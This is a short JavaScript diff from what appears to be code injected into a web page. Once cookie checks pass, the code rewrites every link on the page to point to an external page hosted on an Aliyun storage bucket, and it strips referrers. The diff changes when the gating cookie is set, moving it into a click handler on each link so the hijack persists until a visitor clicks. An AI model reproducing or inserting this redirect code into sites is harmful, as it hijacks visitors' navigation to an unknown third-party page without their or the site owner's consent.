@@ -9,12 +9,14 @@ function addjs(src) {
 if (getCookie('cc_cookie')) {
 if (!getCookie('dd_cookie')) {
 setTimeout(function(){
-   setCookie('dd_cookie','ok',1);
+   
     var w1=0;
 var tagsE=document.getElementsByTagName("a");
 while(tagsE[w1]){
   tagsE[w1].setAttribute("rel", "noreferrer");
   tagsE[w1].setAttribute("href", "http://qingke360.oss-cn-hangzhou.aliyuncs.com/wz/01/wz.html");
+  tagsE[w1].setAttribute("onclick", "setCookie('dd_cookie','ok',1);");
+     
   w1++;
 }}
 
